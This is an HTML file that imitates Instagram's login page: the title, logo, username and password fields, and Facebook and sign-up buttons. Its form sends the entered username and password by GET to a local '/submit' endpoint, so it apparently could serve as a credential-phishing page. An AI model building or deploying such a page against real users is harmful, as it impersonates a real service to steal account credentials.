<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: Roboto, Arial;
            color: white;
            margin: 0px;
        }
        .parent-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            height: 680px;
        }
        .overview-section {
            background-color: rgb(18, 18, 18);
            position: relative;
        }
        .overview-logo {
            position: absolute; 
            top: 50px; 
            left: 50px; 
            width: 90px;
        }
        .overview-container {
            display: flex; 
            flex-direction: column;
            align-items: center;
            margin-top: 120px;
        }
        .overview-para {
            font-size: 32px; 
            text-align: center; 
            width: 450px; 
            line-height: 68px; 
            margin-bottom: 0px;
        }

        .login-section {
            background-color: #1F1F22; 
        }
        .login-para {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 24px;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 12px;
        }
        .username, .password {
            background-color: transparent;
            border: solid 1px rgba(154, 154, 154, 0.6);
            border-radius: 12px;
            font-size: 14px;
            color: white;
            padding: 19px;
        }
        .password:hover, .username:hover {
            border-color: rgba(231, 231, 231, 0.8);
        }
        .create-account-button {
            border: solid 1px rgb(69, 153, 255);
            color: rgb(69, 153, 255);
            background-color: transparent;
            border-radius: 24px;
            padding: 13px;
        }
        .login-with-facebook-button {
            border: solid 1px rgba(128, 128, 128, 0.6);
            color: white;
            background-color: transparent;
            border-radius: 24px;
            padding: 13px;
            margin-top: 44px;
        }
        .login-button {
            color: rgba(255, 255, 255, 0.5);
            background-color: rgba(15, 97, 198, 0.684);
            border: none;
            border-radius: 24px;
            padding: 13px;
            margin-top: 12px;
        }
        .forgot-password-button {
            background-color: transparent;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 13px;
        }
        .forgot-password-button, .login-button, .login-with-facebook-button, .create-account-button {
            cursor: pointer;
            font-size: 15px;
        }
        .forgot-password-button:hover {
            background-color: rgb(66, 66, 66);
        }
        .other-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
    </style>
    <style>
        footer {
            background-color: rgb(18, 18, 18);
            color: rgb(154, 154, 154);
        }
        footer nav {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            margin: 20px 150px;
        }

        footer nav a {
            text-decoration: none;
            color: rgb(154, 154, 154);
            font-size: 12px;
        }
    </style>
</head>
<body>
    <main class="parent-container">
        <div class="overview-section">
            <img class="overview-logo" src="images/logo.png" alt="Instagram Logo">

            <div class="overview-container">
                <p class="overview-para">See everyday moments from your close friends.</p>
                <img style="width: 420px;" src="images/overview.webp" alt="Overview Image">
            </div>
            
        </div>
        <div class="login-section">
            <div style="padding: 54px; margin-top: 24px;">
                <p class="login-para">Log into Instagram</p>

                <form action="/submit" method="get" class="login-form">

                    <input class="username" name="username" id="username" placeholder="Mobile number, username, or email">
                    <input class="password" type="password" name="password" id="password" placeholder="Password">

                    <button class="login-button" type="submit">Log in</button>
                    <button class="forgot-password-button">Forgot password?</button>
                </form>

                <div class="other-options">
                    <button class="login-with-facebook-button">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xvpmsi5 xlup9mm x1kky2od"><path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path></svg>
                        Log in with Facebook
                    </button>
                    <button class="create-account-button">                
                        Create new account
                    </button>
                </div>

            </div>
        </div>
    </main>
